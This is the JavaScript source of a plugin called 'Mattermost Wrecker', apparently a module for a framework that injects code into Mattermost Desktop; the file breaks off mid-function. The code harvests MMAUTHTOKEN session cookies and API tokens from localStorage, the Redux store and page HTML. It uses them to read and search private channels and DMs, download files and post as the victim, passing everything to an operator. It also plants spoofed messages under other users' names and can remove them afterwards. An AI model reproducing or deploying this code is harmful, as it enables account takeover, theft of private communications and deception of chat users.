// Mattermost Wrecker — main.js
// Extracts MMAUTHTOKEN cookie + API token from Mattermost Desktop, then uses
// Mattermost REST API v4 for channel listing, message history, and sending messages.

var https = plugin.https;
var http = plugin.http;
var url = plugin.require('url');

var creds = null;       // {token, cookie, serverUrl, teamId, teamName, userId, userName}
var allServers = [];    // Array of credential objects, one per server
var activeServerIndex = 0;
var userMap = {};        // userId -> {username, nickname, firstName, lastName}
var credReady = false;
var bootstrapAttempts = 0;
var injectedMessages = []; // Track spoofed messages for cleanup

// ===== Mattermost API helper =====

function mmAPI(method, path, body) {
    return new Promise(function(resolve, reject) {
        if (!creds || !creds.serverUrl) {
            return reject(new Error('No credentials'));
        }

        var parsed = url.parse(creds.serverUrl);
        var mod = parsed.protocol === 'https:' ? https : http;
        var headers = {
            'Content-Type': 'application/json'
        };
        if (creds.token) {
            headers['Authorization'] = 'Bearer ' + creds.token;
        }
        if (creds.cookie) {
            headers['Cookie'] = 'MMAUTHTOKEN=' + creds.cookie;
        }

        var postData = body ? JSON.stringify(body) : '';
        if (postData) {
            headers['Content-Length'] = Buffer.byteLength(postData);
        }

        var options = {
            hostname: parsed.hostname,
            port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
            path: '/api/v4' + path,
            method: method,
            headers: headers,
            rejectUnauthorized: false
        };

        var req = mod.request(options, function(res) {
            var chunks = [];
            res.on('data', function(chunk) { chunks.push(chunk); });
            res.on('end', function() {
                var rawBody = Buffer.concat(chunks).toString();
                try {
                    var parsed = JSON.parse(rawBody);
                    if (res.statusCode === 429) {
                        // Rate limited
                        var retryAfter = parseInt(res.headers['x-ratelimit-reset'] || '5', 10);
                        var delaySec = retryAfter - Math.floor(Date.now() / 1000);
                        if (delaySec < 1) delaySec = 5;
                        plugin.setTimeout(function() {
                            mmAPI(method, path, body).then(resolve).catch(reject);
                        }, delaySec * 1000);
                        return;
                    }
                    resolve(parsed);
                } catch (e) {
                    reject(new Error('JSON parse error: ' + e.message + ' (status ' + res.statusCode + ')'));
                }
            });
        });
        req.on('error', reject);
        if (postData) req.write(postData);
        req.end();
    });
}

// API call with explicit credentials (for verifying individual servers)
function mmAPIWithCreds(method, serverUrl, token, cookie, path) {
    return new Promise(function(resolve, reject) {
        var parsed = url.parse(serverUrl);
        var mod = parsed.protocol === 'https:' ? https : http;
        var headers = { 'Content-Type': 'application/json' };
        if (token) headers['Authorization'] = 'Bearer ' + token;
        if (cookie) headers['Cookie'] = 'MMAUTHTOKEN=' + cookie;

        var options = {
            hostname: parsed.hostname,
            port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
            path: '/api/v4' + path,
            method: method,
            headers: headers,
            rejectUnauthorized: false
        };

        var req = mod.request(options, function(res) {
            var chunks = [];
            res.on('data', function(chunk) { chunks.push(chunk); });
            res.on('end', function() {
                try { resolve(JSON.parse(Buffer.concat(chunks).toString())); }
                catch (e) { reject(new Error('JSON parse error: ' + e.message)); }
            });
        });
        req.on('error', reject);
        req.end();
    });
}

// ===== Credential extraction =====

function extractCredentials() {
    var windows = plugin.getWindows();
    var diag = { windowCount: windows.length, windows: [], tokenSource: null };

    for (var w = 0; w < windows.length; w++) {
        diag.windows.push({ id: windows[w].id, url: windows[w].url, title: windows[w].title });
    }

    if (windows.length === 0) {
        plugin.sendData('_error', {
            phase: 'cred_extract',
            error: 'No tracked windows found',
            attempt: bootstrapAttempts,
            diag: diag
        });
        return Promise.resolve(null);
    }

    var extractionPromises = [];

    for (var i = 0; i < windows.length; i++) {
        (function(win) {
            // Strategy 1: Extract server URL from window location
            var pUrl = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  try { return window.location.origin; }' +
                '  catch(e) { return null; }' +
                '})()'
            );

            // Strategy 2: localStorage token
            var pToken = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  var results = [];' +
                '  try {' +
                '    var keys = Object.keys(localStorage);' +
                '    for (var i = 0; i < keys.length; i++) {' +
                '      var k = keys[i];' +
                '      var val = localStorage.getItem(k);' +
                '      if (!val) continue;' +
                // Mattermost stores token directly or in JSON structures
                '      if (k.indexOf("token") !== -1 || k === "__db_token" || k === "authToken") {' +
                '        results.push({ source: "localStorage:" + k, token: val });' +
                '      }' +
                // Also scan for token-like strings in larger JSON values
                '      if (val.length > 20 && val.length < 200 && /^[a-z0-9]{26}$/.test(val)) {' +
                '        results.push({ source: "localStorage:" + k, token: val });' +
                '      }' +
                '    }' +
                '  } catch(e) {}' +
                '  return JSON.stringify(results);' +
                '})()'
            );

            // Strategy 3: Redux store extraction
            var pRedux = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  try {' +
                '    var store = null;' +
                '    var globals = ["__REDUX_STORE__", "store", "__store", "reduxStore", "__NEXT_REDUX_STORE__"];' +
                '    for (var g = 0; g < globals.length; g++) {' +
                '      try {' +
                '        if (window[globals[g]] && typeof window[globals[g]].getState === "function") {' +
                '          store = window[globals[g]]; break;' +
                '        }' +
                '      } catch(e) {}' +
                '    }' +
                '    if (!store) {' +
                '      var keys = Object.keys(window);' +
                '      for (var k = 0; k < keys.length; k++) {' +
                '        try {' +
                '          var v = window[keys[k]];' +
                '          if (v && typeof v === "object" && typeof v.getState === "function" && typeof v.dispatch === "function") {' +
                '            store = v; break;' +
                '          }' +
                '        } catch(e) {}' +
                '      }' +
                '    }' +
                '    if (!store) return null;' +
                '    var state = store.getState();' +
                '    var result = {};' +
                // Extract current user
                '    if (state.entities && state.entities.users && state.entities.users.currentUserId) {' +
                '      result.userId = state.entities.users.currentUserId;' +
                '      var cu = state.entities.users.profiles && state.entities.users.profiles[result.userId];' +
                '      if (cu) {' +
                '        result.userName = cu.username || "";' +
                '        result.nickname = cu.nickname || "";' +
                '      }' +
                '    }' +
                // Extract current team
                '    if (state.entities && state.entities.teams) {' +
                '      result.currentTeamId = state.entities.teams.currentTeamId || "";' +
                '      if (result.currentTeamId && state.entities.teams.teams) {' +
                '        var team = state.entities.teams.teams[result.currentTeamId];' +
                '        if (team) result.teamName = team.display_name || team.name || "";' +
                '      }' +
                '    }' +
                // Extract credentials from state if available
                '    if (state.entities && state.entities.general && state.entities.general.credentials) {' +
                '      var gc = state.entities.general.credentials;' +
                '      if (gc.url) result.serverUrl = gc.url;' +
                '      if (gc.token) result.token = gc.token;' +
                '    }' +
                '    return JSON.stringify(result);' +
                '  } catch(e) { return null; }' +
                '})()'
            );

            // Strategy 4: HTML scrape for config/token
            var pHtml = plugin.executeInRenderer(win.id,
                '(function() {' +
                '  try {' +
                '    var html = document.documentElement.innerHTML;' +
                '    var result = {};' +
                '    var tokenMatch = html.match(/["\']token["\']\\s*:\\s*["\']([a-z0-9]{26})["\']/);' +
                '    if (tokenMatch) result.token = tokenMatch[1];' +
                '    return JSON.stringify(result);' +
                '  } catch(e) { return null; }' +
                '})()'
            );

            extractionPromises.push(Promise.all([pUrl, pToken, pRedux, pHtml]).then(function(r) {
                return { windowId: win.id, url: r[0], tokens: r[1], redux: r[2], html: r[3] };
            }));
        })(windows[i]);
    }

    return Promise.all(extractionPromises).then(function(windowResults) {
        // Also extract cookies from all sessions
        return extractMMCookies(diag).then(function(cookies) {
            return { windowResults: windowResults, cookies: cookies };
        });
    }).then(function(data) {
        var windowResults = data.windowResults;
        var cookies = data.cookies || [];

        // Build candidate credentials from each window
        var candidates = [];
        for (var w = 0; w < windowResults.length; w++) {
            var wr = windowResults[w];
            var serverUrl = wr.url || '';
            // Skip internal pages
            if (!serverUrl || serverUrl === 'about:blank' || serverUrl.indexOf('chrome') === 0) continue;
            // Normalize — strip path
            try { serverUrl = new url.URL(serverUrl).origin; } catch(e) {}

            var token = '';
            var userId = '';
            var userName = '';
            var teamId = '';
            var teamName = '';

            // From Redux
            if (wr.redux) {
                try {
                    var rd = JSON.parse(wr.redux);
                    if (rd.token) token = rd.token;
                    if (rd.serverUrl) serverUrl = rd.serverUrl;
                    if (rd.userId) userId = rd.userId;
                    if (rd.userName) userName = rd.userName;
                    if (rd.currentTeamId) teamId = rd.currentTeamId;
                    if (rd.teamName) teamName = rd.teamName;
                } catch(e) {}
            }

            // From localStorage tokens
            if (!token && wr.tokens) {
                try {
                    var toks = JSON.parse(wr.tokens);
                    if (toks.length > 0) token = toks[0].token;
                } catch(e) {}
            }

            // From HTML
            if (!token && wr.html) {
                try {
                    var hd = JSON.parse(wr.html);
                    if (hd.token) token = hd.token;
                } catch(e) {}
            }

            // Match cookie by domain
            var matchedCookie = '';
            try {
                var serverHost = new url.URL(serverUrl).hostname;
                for (var c = 0; c < cookies.length; c++) {
                    if (cookies[c].domain && (serverHost.indexOf(cookies[c].domain.replace(/^\./, '')) !== -1 ||
                        cookies[c].domain.replace(/^\./, '').indexOf(serverHost) !== -1)) {
                        matchedCookie = cookies[c].value;
                        break;
                    }
                }
                // If no domain match, use any MMAUTHTOKEN
                if (!matchedCookie && cookies.length > 0) {
                    matchedCookie = cookies[0].value;
                }
            } catch(e) {}

            // Token and cookie might be the same value for Mattermost
            if (!token && matchedCookie) token = matchedCookie;

            if (serverUrl && (token || matchedCookie)) {
                candidates.push({
                    serverUrl: serverUrl,
                    token: token,
                    cookie: matchedCookie || token,
                    teamId: teamId,
                    teamName: teamName,
                    userId: userId,
                    userName: userName,
                    windowId: wr.windowId
                });
            }
        }

        // Deduplicate by serverUrl
        var seen = {};
        var unique = [];
        for (var u = 0; u < candidates.length; u++) {
            var key = candidates[u].serverUrl + ':' + candidates[u].token;
            if (!seen[key]) {
                seen[key] = true;
                unique.push(candidates[u]);
            }
        }

        if (unique.length === 0) {
            plugin.sendData('_error', {
                phase: 'cred_extract',
                error: 'No Mattermost credentials found',
                attempt: bootstrapAttempts,
                cookieCount: cookies.length,
                diag: diag
            });
            return null;
        }

        // Verify each candidate via /users/me
        var verifyPromises = [];
        for (var v = 0; v < unique.length; v++) {
            (function(cand) {
                verifyPromises.push(
                    mmAPIWithCreds('GET', cand.serverUrl, cand.token, cand.cookie, '/users/me')
                        .then(function(me) {
                            if (me && me.id && !me.status_code) {
                                cand.userId = me.id;
                                cand.userName = me.username || '';
                                cand.verified = true;
                                return cand;
                            }
                            return null;
                        })
                        .catch(function() { return null; })
                );
            })(unique[v]);
        }

        return Promise.all(verifyPromises).then(function(verified) {
            var validServers = [];
            for (var vr = 0; vr < verified.length; vr++) {
                if (verified[vr]) validServers.push(verified[vr]);
            }
            return validServers.length > 0 ? validServers : null;
        });
    });
}

function extractMMCookies(diag) {
    var session = plugin.electron.session;
    var allCookies = [];

    // Get MMAUTHTOKEN from default session (all domains)
    return session.defaultSession.cookies.get({ name: 'MMAUTHTOKEN' })
        .catch(function() { return []; })
        .then(function(cookies) {
            for (var i = 0; i < cookies.length; i++) {
                allCookies.push(cookies[i]);
            }

            // Also try partitioned sessions
            var BrowserWindow = plugin.electron.BrowserWindow;
            var allWindows = BrowserWindow.getAllWindows();
            var sessions = [];

            for (var w = 0; w < allWindows.length; w++) {
                try {
                    var wc = allWindows[w].webContents;
                    if (wc && wc.session && wc.session !== session.defaultSession) {
                        var alreadyHave = false;
                        for (var s = 0; s < sessions.length; s++) {
                            if (sessions[s] === wc.session) { alreadyHave = true; break; }
                        }
                        if (!alreadyHave) sessions.push(wc.session);
                    }
                } catch(e) {}
            }

            if (sessions.length === 0) return allCookies;

            var chain = Promise.resolve();
            for (var p = 0; p < sessions.length; p++) {
                (function(sess) {
                    chain = chain.then(function() {
                        return sess.cookies.get({ name: 'MMAUTHTOKEN' })
                            .catch(function() { return []; })
                            .then(function(cookies) {
                                for (var c = 0; c < cookies.length; c++) {
                                    allCookies.push(cookies[c]);
                                }
                            });
                    });
                })(sessions[p]);
            }

            return chain.then(function() { return allCookies; });
        });
}

// ===== Identity & Team fetching =====

function fetchIdentity() {
    return mmAPI('GET', '/users/me').then(function(me) {
        if (me && me.id && !me.status_code) {
            creds.userId = me.id;
            creds.userName = me.username || '';
            creds.status = 'syncing';
            plugin.sendData('credentials', creds);
            return true;
        }
        creds.status = 'auth_failed';
        plugin.sendData('credentials', creds);
        plugin.sendData('_error', { phase: 'identity', error: 'users/me failed', detail: me });
        return false;
    }).catch(function(e) {
        creds.status = 'auth_failed';
        plugin.sendData('credentials', creds);
        plugin.sendData('_error', { phase: 'identity', error: String(e) });
        return false;
    });
}

function fetchTeams() {
    if (!creds.userId) return Promise.resolve();
    return mmAPI('GET', '/users/' + creds.userId + '/teams').then(function(teams) {
        if (teams && Array.isArray(teams) && teams.length > 0) {
            // Pick current team or first
            if (!creds.teamId) {
                creds.teamId = teams[0].id;
                creds.teamName = teams[0].display_name || teams[0].name || '';
            } else {
                for (var t = 0; t < teams.length; t++) {
                    if (teams[t].id === creds.teamId) {
                        creds.teamName = teams[t].display_name || teams[t].name || '';
                        break;
                    }
                }
            }
            plugin.sendData('credentials', creds);
        }
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'teams', error: String(e) });
    });
}

// ===== Channel fetching =====

function fetchChannels() {
    if (!creds.userId || !creds.teamId) return Promise.resolve();

    // Fetch team channels + direct/group messages
    return Promise.all([
        mmAPI('GET', '/users/' + creds.userId + '/teams/' + creds.teamId + '/channels'),
        mmAPI('GET', '/users/' + creds.userId + '/channels?last_delete_at=0&include_deleted=false&page=0&per_page=200')
    ]).then(function(results) {
        var teamChannels = results[0] || [];
        var allUserChannels = results[1] || [];

        // Merge, dedup by id
        var seen = {};
        var channels = [];

        function addChannels(arr) {
            if (!Array.isArray(arr)) return;
            for (var i = 0; i < arr.length; i++) {
                var ch = arr[i];
                if (!ch || !ch.id || seen[ch.id]) continue;
                seen[ch.id] = true;

                var type = 'public';
                if (ch.type === 'P') type = 'private';
                else if (ch.type === 'D') type = 'dm';
                else if (ch.type === 'G') type = 'group_dm';

                var name = ch.display_name || ch.name || ch.id;
                // For DMs, resolve the other user's name
                if (type === 'dm' && ch.name) {
                    var parts = ch.name.split('__');
                    var otherId = '';
                    for (var p = 0; p < parts.length; p++) {
                        if (parts[p] !== creds.userId) { otherId = parts[p]; break; }
                    }
                    if (otherId && userMap[otherId]) {
                        name = userMap[otherId].username || userMap[otherId].nickname || name;
                    } else if (otherId) {
                        name = otherId; // Will resolve after users load
                    }
                }

                channels.push({
                    id: ch.id,
                    name: name,
                    type: type,
                    topic: (ch.header || '').substring(0, 200),
                    purpose: (ch.purpose && ch.purpose.value) ? ch.purpose.value.substring(0, 200) : '',
                    memberCount: ch.total_msg_count || 0
                });
            }
        }

        addChannels(teamChannels);
        addChannels(allUserChannels);

        // Sort: public first, then private, then group DM, then DM
        var typeOrder = { 'public': 0, 'private': 1, 'group_dm': 2, 'dm': 3 };
        channels.sort(function(a, b) {
            var ta = typeOrder[a.type] || 4;
            var tb = typeOrder[b.type] || 4;
            if (ta !== tb) return ta - tb;
            return (a.name || '').localeCompare(b.name || '');
        });

        plugin.sendData('channel_list', { channels: channels });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'channels', error: String(e) });
    });
}

// ===== User fetching =====

function fetchUsers() {
    var page = 0;
    var perPage = 200;
    var allUsers = [];

    function fetchPage() {
        return mmAPI('GET', '/users?page=' + page + '&per_page=' + perPage).then(function(users) {
            if (!Array.isArray(users)) return;
            for (var i = 0; i < users.length; i++) {
                var u = users[i];
                userMap[u.id] = {
                    username: u.username || '',
                    nickname: u.nickname || '',
                    firstName: u.first_name || '',
                    lastName: u.last_name || ''
                };
                allUsers.push({
                    id: u.id,
                    name: u.username || '',
                    realName: ((u.first_name || '') + ' ' + (u.last_name || '')).trim() || u.nickname || '',
                    deleted: u.delete_at > 0
                });
            }
            if (users.length === perPage && page < 20) {
                page++;
                return fetchPage();
            }
        });
    }

    return fetchPage().then(function() {
        plugin.sendData('user_list', { users: allUsers });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'users', error: String(e) });
    });
}

// ===== Batch resolve unknown user IDs =====

function resolveUnknownUsers(userIds) {
    // Filter to IDs not already in userMap
    var unknown = [];
    for (var i = 0; i < userIds.length; i++) {
        if (userIds[i] && !userMap[userIds[i]]) {
            // Deduplicate
            var found = false;
            for (var j = 0; j < unknown.length; j++) {
                if (unknown[j] === userIds[i]) { found = true; break; }
            }
            if (!found) unknown.push(userIds[i]);
        }
    }
    if (unknown.length === 0) return Promise.resolve();

    // POST /api/v4/users/ids — batch fetch user objects by ID
    return mmAPI('POST', '/users/ids', unknown).then(function(users) {
        if (!Array.isArray(users)) return;
        for (var k = 0; k < users.length; k++) {
            var u = users[k];
            userMap[u.id] = {
                username: u.username || '',
                nickname: u.nickname || '',
                firstName: u.first_name || '',
                lastName: u.last_name || ''
            };
        }
    }).catch(function() {
        // Silently fail — we'll just show raw IDs for unresolved users
    });
}

function resolveUserName(userId) {
    if (userMap[userId]) return userMap[userId].username || userId;
    return userId;
}

// ===== Message fetching =====

function fetchMessages(channelId, channelName, limit) {
    var perPage = limit || 50;
    return mmAPI('GET', '/channels/' + channelId + '/posts?page=0&per_page=' + perPage).then(function(data) {
        if (!data || !data.order || !data.posts) {
            plugin.sendData('_error', { phase: 'messages', error: 'Unexpected response format', channelId: channelId });
            return;
        }

        // Collect all user IDs from posts
        var postUserIds = [];
        for (var i = 0; i < data.order.length; i++) {
            var post = data.posts[data.order[i]];
            if (post && post.user_id) postUserIds.push(post.user_id);
        }

        // Batch-fetch any unknown users, then build messages
        return resolveUnknownUsers(postUserIds).then(function() {
            var messages = [];
            for (var i = 0; i < data.order.length; i++) {
                var postId = data.order[i];
                var post = data.posts[postId];
                if (!post) continue;

                // System messages (join/leave/etc) show "System" like the native app
                var isSystem = post.type && post.type.indexOf('system_') === 0;
                var userName = isSystem ? 'System' : resolveUserName(post.user_id);

                var files = [];
                if (post.file_ids && post.file_ids.length > 0) {
                    for (var f = 0; f < post.file_ids.length; f++) {
                        files.push({ fileId: post.file_ids[f] });
                    }
                }
                // If metadata has files info, enrich
                if (post.metadata && post.metadata.files) {
                    files = [];
                    for (var mf = 0; mf < post.metadata.files.length; mf++) {
                        var fi = post.metadata.files[mf];
                        files.push({
                            fileId: fi.id,
                            name: fi.name || 'file',
                            size: fi.size || 0,
                            mimetype: fi.mime_type || ''
                        });
                    }
                }

                // Build message text — system posts sometimes have empty message
                // but store info in props
                var msgText = post.message || '';
                if (isSystem && !msgText && post.props) {
                    var actor = post.props.username || resolveUserName(post.user_id);
                    if (post.type === 'system_join_channel') msgText = '@' + actor + ' joined the channel.';
                    else if (post.type === 'system_leave_channel') msgText = '@' + actor + ' left the channel.';
                    else if (post.type === 'system_add_to_channel') msgText = '@' + (post.props.addedUsername || 'user') + ' was added to the channel by @' + actor + '.';
                    else if (post.type === 'system_join_team') msgText = '@' + actor + ' joined the team.';
                    else if (post.type === 'system_leave_team') msgText = '@' + actor + ' left the team.';
                    else msgText = post.type.replace('system_', '').replace(/_/g, ' ');
                }

                messages.push({
                    id: post.id,
                    user: userName,
                    userId: post.user_id,
                    text: msgText,
                    time: post.create_at ? new Date(post.create_at).toISOString() : '',
                    ts: post.create_at,
                    type: post.type || '',
                    files: files
                });
            }

            // Mattermost order is newest first — reverse for display
            messages.reverse();

            plugin.sendData('messages', {
                channelId: channelId,
                channelName: channelName || channelId,
                messages: messages
            });
        });
    }).catch(function(e) {
        plugin.sendData('_error', { phase: 'messages', error: String(e), channelId: channelId });
    });
}

// ===== Send message =====

function sendMessage(channelId, text, channelName) {
    return mmAPI('POST', '/posts', {
        channel_id: channelId,
        message: text
    }).then(function(result) {
        if (result && result.id) {
            plugin.sendData('send_result', { channelId: channelId, ok: true });
            // Re-fetch to show the new message
            return fetchMessages(channelId, channelName);
        } else {
            plugin.sendData('send_result', { channelId: channelId, ok: false, error: result.message || 'Unknown error' });
        }
    }).catch(function(e) {
        plugin.sendData('send_result', { channelId: channelId, ok: false, error: String(e) });
    });
}

// ===== Search =====

function searchMessages(query, count, page) {
    if (!creds || !creds.teamId) {
        plugin.sendData('search_results', { query: query, matches: [], total: 0, error: 'No teamId — teams not loaded yet' });
        plugin.sendData('_error', { phase: 'search', error: 'No teamId available. creds.teamId=' + (creds ? creds.teamId : 'null') });
        return Promise.resolve();
    }

    var searchPath = '/teams/' + creds.teamId + '/posts/search';

    return mmAPI('POST', searchPath, {
        terms: query,
        is_or_search: false
    }).then(function(data) {
        if (!data) {
            plugin.sendData('search_results', { query: query, matches: [], total: 0, error: 'No response from API' });
            return;
        }

        // Check for API error response first
        if (data.status_code && data.status_code >= 400) {
            plugin.sendData('search_results', { query: query, matches: [], total: 0, error: 'API ' + data.status_code + ': ' + (data.message || 'Unknown error') });
            return;
        }
        if (data.message && !data.order) {
            plugin.sendData('search_results', { query: query, matches: [], total: 0, error: data.message });
            return;
        }

        // Mattermost returns {order: [...], posts: {...}} but order can be null/empty
        var order = data.order || [];
        var posts = data.posts || {};

        // Collect user IDs from search results for batch resolution
        var searchUserIds = [];
        for (var j = 0; j < order.length; j++) {
            var p = posts[order[j]];
            if (p && p.user_id) searchUserIds.push(p.user_id);
        }

        return resolveUnknownUsers(searchUserIds).then(function() {
            var matches = [];
            for (var i = 0; i < order.length; i++) {
                var post = posts[order[i]];
                if (!post) continue;

                var isSystem = post.type && post.type.indexOf('system_') === 0;
                var userName = isSystem ? 'System' : resolveUserName(post.user_id);

                // Resolve channel name from our cached channels
                var channelName = '';
                // Channel name resolution happens on UI side via channels array

                matches.push({
                    user: userName,
                    text: post.message || post.type || '',
                    time: post.create_at ? new Date(post.create_at).toISOString() : '',
                    channelId: post.channel_id,
                    channelName: channelName
                });
            }

            plugin.sendData('search_results', {
                query: query,
                matches: matches,
                total: matches.length
            });
        });
    }).catch(function(e) {
        plugin.sendData('search_results', { query: query, matches: [], total: 0, error: 'Search failed: ' + String(e) });
        plugin.sendData('_error', { phase: 'search', error: String(e), stack: e.stack || '' });
    });
}

// ===== File download =====

function downloadFileRaw(fileId, fileName) {
    return new Promise(function(resolve) {
        var parsed = url.parse(creds.serverUrl);
        var mod = parsed.protocol === 'https:' ? https : http;
        var headers = {};
        if (creds.token) headers['Authorization'] = 'Bearer ' + creds.token;
        if (creds.cookie) headers['Cookie'] = 'MMAUTHTOKEN=' + creds.cookie;

        var options = {
            hostname: parsed.hostname,
            port: parsed.port || (parsed.protocol === 'https:' ? 443 : 80),
            path: '/api/v4/files/' + fileId,
            method: 'GET',
            headers: headers,
            rejectUnauthorized: false
        };

        var req = mod.request(options, function(res) {
            var chunks = [];
            res.on('data', function(chunk) { chunks.push(chunk); });
            res.on('end', function() {
                var buf = Buffer.concat(chunks);
                var ct = res.headers['content-type'] || 'application/octet-stream';
                plugin.sendData('file_download', {
                    fileId: fileId,
                    fileName: fileName || fileId,
                    contentType: ct,
                    data: buf.toString('base64')
                });
                resolve();
            });
        });
        req.on('error', function(e) {
            plugin.sendData('file_download', { fileId: fileId, fileName: fileName, error: String(e) });
            resolve();
        });
        req.end();
    });
}

// ===== Message injection (DOM clone) =====

function findMattermostWindow() {
    var windows = plugin.getWindows();
    for (var i = 0; i < windows.length; i++) {
        var winUrl = windows[i].url || '';
        if (winUrl.indexOf(creds.serverUrl) !== -1 || winUrl.indexOf('mattermost') !== -1) {
            return Promise.resolve(windows[i].id);
        }
    }
    // Fallback: first window
    if (windows.length > 0) return Promise.resolve(windows[0].id);
    return Promise.resolve(null);
}

function injectMessage(channelId, senderId, text, senderName) {
    return findMattermostWindow().then(function(windowId) {
        if (!windowId) {
            plugin.sendData('inject_result', { channelId: channelId, strategy: 'none', success: false, error: 'No window found' });
            return;
        }

        var safeSenderId = JSON.stringify(senderId || 'unknown');
        var safeSenderName = JSON.stringify(senderName || 'Unknown User');
        var safeText = JSON.stringify(text || '');
        var safeChannelId = JSON.stringify(channelId || '');
        var fakeTs = String(Date.now());

        var code =
            '(function() {' +
            '  var senderId = ' + safeSenderId + ';' +
            '  var senderName = ' + safeSenderName + ';' +
            '  var text = ' + safeText + ';' +
            '  var channelId = ' + safeChannelId + ';' +
            '  var result = { channelId: channelId, strategy: "none", success: false, error: null, ts: "' + fakeTs + '" };' +
            '' +
            // Strategy 1: DOM clone — find the post list and clone last message
            '  try {' +
            '    var postList = document.querySelector("#post-list") || document.querySelector(".post-list__content") || document.querySelector("[class*=\\"PostList\\"]");' +
            '    if (!postList) {' +
            '      var candidates = document.querySelectorAll("[id*=\\"post\\"], [class*=\\"post-list\\"], [class*=\\"PostList\\"]");' +
            '      for (var ci = 0; ci < candidates.length; ci++) {' +
            '        if (candidates[ci].children && candidates[ci].children.length > 3) { postList = candidates[ci]; break; }' +
            '      }' +
            '    }' +
            '    if (postList) {' +
            '      var lastPost = postList.querySelector("[id^=\\"post_\\"]:last-child") || postList.querySelector("[class*=\\"Post\\"]:last-child") || postList.lastElementChild;' +
            '      if (lastPost) {' +
            '        var clone = lastPost.cloneNode(true);' +
            '        clone.setAttribute("data-jstap-injected", "true");' +
            '        clone.removeAttribute("id");' +
            // Replace message text
            '        var textEl = clone.querySelector("[id^=\\"postMessageText\\"]") || clone.querySelector(".post-message__text") || clone.querySelector("[class*=\\"PostBody\\"] p") || clone.querySelector("p");' +
            '        if (textEl) textEl.textContent = text;' +
            '        else { var ps = clone.querySelectorAll("p, span, div"); if (ps.length > 1) ps[ps.length - 1].textContent = text; }' +
            // Replace sender name
            '        var nameEl = clone.querySelector(".post__header [class*=\\"user-popover\\"]") || clone.querySelector("[class*=\\"PostHeader\\"] button") || clone.querySelector("[class*=\\"user-popover\\"]") || clone.querySelector("button[class*=\\"username\\"]");' +
            '        if (nameEl) nameEl.textContent = senderName;' +
            // Replace timestamp
            '        var timeEl = clone.querySelector("time") || clone.querySelector("[class*=\\"post__time\\"]") || clone.querySelector("[class*=\\"timestamp\\"]");' +
            '        if (timeEl) {' +
            '          var now = new Date();' +
            '          timeEl.textContent = now.getHours() + ":" + (now.getMinutes() < 10 ? "0" : "") + now.getMinutes();' +
            '          if (timeEl.dateTime) timeEl.dateTime = now.toISOString();' +
            '        }' +
            // Replace avatar
            '        var avatarEl = clone.querySelector(".post__img img") || clone.querySelector("[class*=\\"Avatar\\"] img") || clone.querySelector("img[src*=\\"api/v4/users\\"]");' +
            '        if (avatarEl && senderId) {' +
            '          avatarEl.src = window.location.origin + "/api/v4/users/" + senderId + "/image?_=" + Date.now();' +
            '        }' +
            // Remove reactions, comments count etc
            '        var reactions = clone.querySelector("[class*=\\"Reaction\\"]") || clone.querySelector(".post__footer");' +
            '        if (reactions) reactions.remove();' +
            '' +
            '        postList.appendChild(clone);' +
            '        clone.scrollIntoView({ behavior: "smooth" });' +
            '        result.strategy = "dom_clone";' +
            '        result.success = true;' +
            '      } else {' +
            // No existing messages — inject raw HTML
            '        var div = document.createElement("div");' +
            '        div.setAttribute("data-jstap-injected", "true");' +
            '        div.style.cssText = "padding:8px 16px;";' +
            '        div.innerHTML = "<strong>" + senderName.replace(/</g,"&lt;") + "</strong> <span style=\\"color:#999;font-size:0.8em\\">" + new Date().toLocaleTimeString() + "</span><div>" + text.replace(/</g,"&lt;") + "</div>";' +
            '        postList.appendChild(div);' +
            '        result.strategy = "dom_raw";' +
            '        result.success = true;' +
            '      }' +
            '    } else {' +
            '      result.error = "No post list container found";' +
            '    }' +
            '  } catch(e) { result.error = "dom_clone: " + String(e); }' +
            '' +
            '  return JSON.stringify(result);' +
            '})()';

        return plugin.executeInRenderer(windowId, code).then(function(raw) {
            try {
                var data = JSON.parse(raw);
                if (data.success && data.ts) {
                    injectedMessages.push({
                        channelId: channelId,
                        ts: data.ts,
                        senderId: senderId,
                        senderName: senderName,
                        text: (text || '').substring(0, 100),
                        time: new Date().toISOString()
                    });
                    plugin.sendData('injected_messages', { messages: injectedMessages, count: injectedMessages.length });
                }
                plugin.sendData('inject_result', data);
            } catch (e) {
                plugin.sendData('inject_result', { channelId: channelId, strategy: 'none', success: false, error: 'Parse error: ' + String(e) });
            }
        }).catch(function(e) {
            plugin.sendData('inject_result', { channelId: channelId, strategy: 'none', success: false, error: String(e) });
        });
    });
}

// ===== Injected message cleanup =====

function clearInjectedMessages() {
    if (injectedMessages.length === 0) {
        plugin.sendData('clear_injected_result', { success: true, cleared: 0, message: 'No injected messages to clear' });
        return Promise.resolve();
    }

    return findMattermostWindow().then(function(windowId) {
        if (!windowId) {
            plugin.sendData('clear_injected_result', { success: false, error: 'No window available' });
            return;
        }

        var code =
            '(function() {' +
            '  var injected = document.querySelectorAll("[data-jstap-injected]");' +
            '  var count = injected.length;' +
            '  for (var i = 0; i < injected.length; i++) {' +
            '    injected[i].remove();' +
            '  }' +
            '  return JSON.stringify({ cleared: count });' +
            '})()';

        return plugin.executeInRenderer(windowId, code).then(function(raw) {
            try {
                var data = JSON.parse(raw);
                injectedMessages = [];
                plugin.sendData('injected_messages', { messages: [], count: 0 });
                plugin.sendData('clear_injected_result', {
                    success: true,
                    cleared: data.cleared || 0,
                    method: 'dom_remove'
                });
            } catch (e) {
                plugin.sendData('clear_injected_result', { success: false, error: 'Parse error: ' + String(e) });
            }
        }).catch(function(e) {
            plugin.sendData('clear_injected_result', { success: false, error: String(e) });
        });
    });
}

// ===== Command handler =====

function onCommand(cmd) {
    var action = cmd.action;

    // Renderer-level commands — no API credentials needed
    if (action === 'inject_message') return injectMessage(cmd.channelId, cmd.senderId, cmd.text, cmd.senderName);
    if (action === 'clear_injected') return clearInjectedMessages();

    // Server switching
    if (action === 'switch_server') {
        var idx = parseInt(cmd.serverIndex, 10);
        if (isNaN(idx) || idx < 0 || idx >= allServers.length) {
            plugin.sendData('_error', { phase: 'switch_server', error: 'Invalid server index: ' + cmd.serverIndex });
            return;
        }
        activeServerIndex = idx;
        creds = allServers[idx];
        userMap = {};

        var sList = [];
        for (var si = 0; si < allServers.length; si++) {
            sList.push({
                teamName: allServers[si].teamName || '?',
